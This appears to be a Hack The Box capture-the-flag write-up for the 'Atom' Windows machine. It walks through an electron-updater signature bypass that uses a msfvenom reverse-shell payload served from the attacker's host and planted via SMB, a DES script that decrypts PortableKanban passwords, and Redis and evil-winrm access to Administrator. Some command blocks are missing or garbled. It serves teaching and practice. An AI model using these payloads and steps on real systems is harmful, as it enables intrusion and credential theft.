# Personal thoughts
Reversing an electron app, PortableKanban and Redis; these are the new stuff I learned from this box. I'm sure you'll learn many new stuff from this writeup. As usually, I tried to explain the steps as simple as I can. Hope you'll find it useful; if so, consider [suporting](https://www.buymeacoffee.com/f4T1H21) a student to get `OSCP` exam and __+respecting my profile in HTB__.

We have lots of `tcp` ports open. but this is a `Windows` box, so you need to get used to this much of open `tcp` ports. :wink:

Let's see what we get from the web port, which is in this case: `80/http`

## 80/http

A simple web site, I noticed a subdirectory called `releases` with an executable file in it.

![](src/dir.png)

After installing and extracting it, we notice an executable file.

```bash
â”Œâ”€â”€(rootðŸ’€f4T1H)-[~/hackthebox/atom]
â””â”€> curl http://10.10.10.237/releases/heed_setup_v1.0.0.zip -O
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current

â”Œâ”€â”€(rootðŸ’€f4T1H)-[~/hackthebox/atom]
â””â”€> unzip heed_setup_v1.0.0.zip
Archive:  heed_setup_v1.0.0.zip
  inflating: heedv1 Setup 1.0.0.exe  

â”Œâ”€â”€(rootðŸ’€f4T1H)-[~/hackthebox/atom]
â””â”€> file heedv1\ Setup\ 1.0.0.exe
heedv1 Setup 1.0.0.exe: PE32 executable (GUI) Intel 80386, for MS Windows, Nullsoft Installer self-extracting archive
```

But trying to detect its format with `file` command outputs as `self-extracting archive`, and that looks like it needs to be extracted, lol.

```bash
â”Œâ”€â”€(rootðŸ’€f4T1H)-[~/hackthebox/atom]
â””â”€> mkdir heed && cd heed && 7z x ../heedv1\ Setup\ 1.0.0.exe 1>/dev/null && ls
'$PLUGINSDIR'  'Uninstall heedv1.exe'
```

Again extract the file `app-64.7z`

```bash
â”Œâ”€â”€(rootðŸ’€f4T1H)-[~/hackthebox/atom/heed]
â””â”€> cd \$PLUGINSDIR && ls
app-64.7z  nsis7z.dll  nsProcess.dll  SpiderBanner.dll  StdUtils.dll  System.dll  WinShell.dll

â”Œâ”€â”€(rootðŸ’€f4T1H)-[~/hackthebox/atom/heed/$PLUGINSDIR]
â””â”€> mkdir app-64 && cd app-64 && 7z x ../app-64.7z 1>/dev/null && ls
chrome_100_percent.pak  ffmpeg.dll  libEGL.dll            LICENSES.chromium.html  resources          swiftshader              VkLayer_core_validation.dll       VkLayer_threading.dll
chrome_200_percent.pak  heedv1.exe  libGLESv2.dll         locales                 resources.pak      v8_context_snapshot.bin  VkLayer_object_tracker.dll        VkLayer_unique_objects.dll
d3dcompiler_47.dll      icudtl.dat  LICENSE.electron.txt  natives_blob.bin        snapshot_blob.bin  VkICD_mock_icd.dll       VkLayer_parameter_validation.dll
```


After further enumeration, I came up with the two interesting things as follows:

- resources/app-update.yml
	- updates.atom.htb (Same site)
- resources/app.asar
	- Extracting with asar gives us a keyword!

```bash
â”Œâ”€â”€(rootðŸ’€f4T1H)-[~/â€¦/heed/$PLUGINSDIR/app-64/resources]
â””â”€> mkdir app && cd app && asar e ../app.asar . && ls
createNote.html  icons  main.js  node_modules  package.json  version.html

â”Œâ”€â”€(rootðŸ’€f4T1H)-[~/â€¦/$PLUGINSDIR/app-64/resources/app]
â””â”€> head main.js    
const {app, BrowserWindow, Menu, protocol, ipcMain} = require('electron');
const log = require('electron-log');
const {autoUpdater} = require("electron-updater");
const path = require('path');

autoUpdater.logger = log;
autoUpdater.logger.transports.file.level = 'debug';

let win;
let addWindow;
```

You see the third line? `electron-updater`, we got some new terms here!<br><br>
Okay but, what is `electron` ? We're not in physics class XD

>[Electron](https://www.electronjs.org/docs/tutorial/introduction) is a framework for building desktop applications using JavaScript, HTML, and CSS. By embedding Chromium and Node.js into its binary, Electron allows you to maintain one JavaScript codebase and create cross-platform apps that work on Windows, macOS, and Linux â€” no native development experience required.

And checking out for an exploit on google gives us [`Signature Validation Bypass`](https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html).

## 445/smb

What is [smb](https://en.wikipedia.org/wiki/Server_Message_Block)?
>In computer networking, Server Message Block (SMB), one version of which was also known as Common Internet File System (CIFS /sÉªfs/), is a communication protocol for providing shared access to files, printers, and serial ports between nodes on a network. It also provides an authenticated inter-process communication (IPC) mechanism. Most usage of SMB involves computers running Microsoft Windows, where it was known as "Microsoft Windows Network" before the introduction of Active Directory. Corresponding Windows services are LAN Manager Server for the server component, and LAN Manager Workstation for the client component.

```bash
â”Œâ”€â”€(rootðŸ’€f4T1H)-[~/hackthebox/atom]

Heedv1.0
Internal QA Documentation

What is Heed ?
Note taking application built with electron-builder which helps users in taking important
notes.

Features ?
Very limited at the moment. Thereâ€™s no server interaction when creating notes. So
currently it just acts as a one-tier thick client application. We are planning to move it to a
full fledged two-tier architecture sometime in the future releases.

What about QA ?
We follow the below process before releasing our products.
1. Build and install the application to make sure it works as we expect it to be.
2. Make sure that the update server running is in a private hardened instance. To
initiate the QA process, just place the updates in one of the "client" folders, and


]\
the appropriate QA team will test it to ensure it finds an update and installs it
correctly.
3. Follow the checklist to see if all given features are working as expected by the
developer.
```

- Here the first command I used for checking if we have passwordless access to `smb shares`.<br>
- Then we got into the `smb share` named `Software_Updates` (because we're struggling with electron-updater - on the other hand and that seemed as a good starting point to me for checking smb shares).<br>
- After that we saw a pdf and downloaded it sing the `get` command.<br>
- Converted it to text file and read it.

And the conclusion here is that we need to use the exploit we found through that client folders in the smb share named `Software_Updates`.


# Foothold: Signature Validation Bypass in electron-updater

![](src/foothold.png)

Nice, let's give it a chance!

First create a payload with `msfvenom`.

```bash
â”Œâ”€â”€(rootðŸ’€f4T1H)-[~/hackthebox/atom/exploit]
â””â”€> msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.29 LPORT=2121 -f exe -o "f4T1H'.exe"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: f4T1H'.exe
```

After that calculate `f4T1H'.exe`'s sha512 hash.

```bash
â”Œâ”€â”€(rootðŸ’€f4T1H)-[~/hackthebox/atom/exploit]
â””â”€> shasum -a 512 f4T1H\'.exe | cut -d " " -f1 | xxd -r -p | base64 -w0
bhHHmCp0jbEhqyTM+ozDS0HuZyTO1GLl2LL7e/UtFDqpIOBdrkGaATy8WNhpoNuu7/IatCNwMYMWuoelZdTPzA==
```

Then `touch` a file named `latest.yml` and put the followings in it:

__latest.yml__
```yaml
version: 1.2.3
path: http://10.10.14.29/f4T1H.'exe
sha512: bhHHmCp0jbEhqyTM+ozDS0HuZyTO1GLl2LL7e/UtFDqpIOBdrkGaATy8WNhpoNuu7/IatCNwMYMWuoelZdTPzA==
releaseDate: '2021-03-16T11:17:02.627Z'
```

__Attention:__ SHA512 hash and the ip address will be yours in this case.

Start an http server on port `80`.

```bash
â”Œâ”€â”€(rootðŸ’€f4T1H)-[~/hackthebox/atom/exploit]
â””â”€> php -S 0.0.0.0:80
[XXX XX XX XX:XX:XX 2021] PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

Finally execute the following so as to put your `latest.yml` in all of the client folders.

```bash
â”Œâ”€â”€(rootðŸ’€f4T1H)-[~/hackthebox/atom/exploit]
â””â”€> smbclient -N //10.10.10.237/Software_Updates -c 'put latest.yml client1/latest.yml; put latest.yml client2/latest.yml; put latest.yml client3/latest.yml'
putting file latest.yml as \client1\latest.yml (0.9 kb/s) (average 0.9 kb/s)
putting file latest.yml as \client2\latest.yml (0.9 kb/s) (average 0.9 kb/s)
putting file latest.yml as \client3\latest.yml (0.9 kb/s) (average 0.9 kb/s)
```

And listen on port `2121`.

```bash
â”Œâ”€â”€(rootðŸ’€f4T1H)-[~/hackthebox/atom/exploit]
â””â”€> nc -lvnp 2121
listening on [any] 2121 ...
```

After waiting for a few seconds (~15), if you do every step correctly, you'll get a shell from the box. If you couldn't get a shell, repeat the uploading process again or reset the machine (it was not stable for me).

That seems like a `JSON` data, save it in a file on your local and parse it using `jq`.

```bash
â”Œâ”€â”€(rootðŸ’€f4T1H)-[~/hackthebox/atom]
â””â”€# cat configFile.cfg | jq . | head
{
  "RoamingSettings": {
    "DataSource": "RedisServer",
    "DbServer": "localhost",
    "DbPort": 6379,
    "DbEncPassword": "Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb",
    "DbServer2": "",
    "DbPort2": 6379,
    "DbEncPassword2": "",
    "DbIndex": 0,
```

We got some new keywords'n terms from here;
- An encrypted password used in logging into `RedisServer`: `Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb`

Let's first try to crack the password and then focus on `redis`.

### PortableKanban

Actually, I don't think what exactly PortableKanban is a must know thing for us. Because I've already found an exploit for it.<br>
(An app for scheduling your tasks with Kanban scheduling system, I couldn't control myself XD)<br><br>
[PortableKanban 4.3.6578.38136 - Encrypted Password Retrieval](https://www.exploit-db.com/exploits/49409)

I modified the exploit and got the password.

__pwdretrieve.py__
```python
#!/usr/bin/python3

import base64
from des import * #pip3 install des

def decode(hash):
        hash = base64.b64decode(hash.encode('utf-8'))
        key = DesKey(b'7ly6UznJ')
        return key.decrypt(hash, initial=b'XuVUm5fR', padding=True).decode('utf-8')

print(decode("Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb"))
```

```bash
â”Œâ”€â”€(rootðŸ’€f4T1H)-[~/hackthebox/atom/privesc]
â””â”€> python3 pwdretrieve.py
kidvscat_yes_kidvscat
```

Alternatively, we could find the password from `redis` service's configuration files.

```shell
PS C:\Program Files\Redis> type *.conf | findstr pass
type *.conf | findstr pass
requirepass kidvscat_yes_kidvscat
# If the master is password protected (using the "requirepass" configuration
# masterauth <master-password>
# resync is enough, just passing the portion of data the slave missed while
# 150k passwords per second against a good box. This means that you should
# use a very strong password otherwise it will be very easy to break.
# requirepass foobared
requirepass kidvscat_yes_kidvscat
# If the master is password protected (using the "requirepass" configuration
# masterauth <master-password>
# resync is enough, just passing the portion of data the slave missed while
# 150k passwords per second against a good box. This means that you should
# use a very strong password otherwise it will be very easy to break.
# requirepass foobared
```

Okay, it's time to have a look at the second term: `redis`.

### redis
What is [`redis`](https://redis.io/) ?
>Redis is an open source (BSD licensed), in-memory data structure store, used as a database, cache, and message broker. Redis provides data structures such as strings, hashes, lists, sets, sorted sets with range queries, bitmaps, hyperloglogs, geospatial indexes, and streams. Redis has built-in replication, Lua scripting, LRU eviction, transactions, and different levels of on-disk persistence, and provides high availability via Redis Sentinel and automatic partitioning with Redis Cluster.

So we'll connect to the redis server and login using the password we cracked, then look inside a bit.<br>
Install `redis-tools` package if you haven't had so.

```bash
â”Œâ”€â”€(rootðŸ’€f4T1H)-[~/hackthebox/atom/privesc]
â””â”€> redis-cli -h 10.10.10.237 -a kidvscat_yes_kidvscat
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.

10.10.10.237:6379>
```

- The first command we used for connecting to the remote server and logging in with the password we found.<br>
- After connecting, `ping` command is used to test if a connection is still alive, or to measure latency.<br>
- After that we had a look at the key databases and `select` the only one.<br>
- Then listed the `keys` in it.<br>
- Finally read the key's content.

So now, we see another Encrypted Password, which belongs to Administrator according to this key.<br>
Let's crack it using the same algorithm but with another way: [CyberChef](https://gchq.github.io/CyberChef/)

Do what you see in the code but with blocks, first decode from `base64` then decrypt `DES` with the keys.<br>
[Shortcut to the recipe](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)DES_Decrypt(%7B'option':'UTF8','string':'7ly6UznJ'%7D,%7B'option':'UTF8','string':'XuVUm5fR'%7D,'CBC','Raw','Raw')&input=T2RoN04zTDlhVlE4L3NyZFpnRzJoSVIwU1NKb0pLR2k)

And as a last step before reading the root flag, connect to machine using `evil-winrm` with the credentials we found.

```bash
â”Œâ”€â”€(rootðŸ’€f4T1H)-[~/hackthebox/atom/privesc]
â””â”€> evil-winrm -i 10.10.10.237 -u administrator -p 'kidvscat_admin_@123'

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
atom\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
e77baXXXXXXXXXXXXXXXXXXXXXx842dd
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

And we successfully pwned the machine...
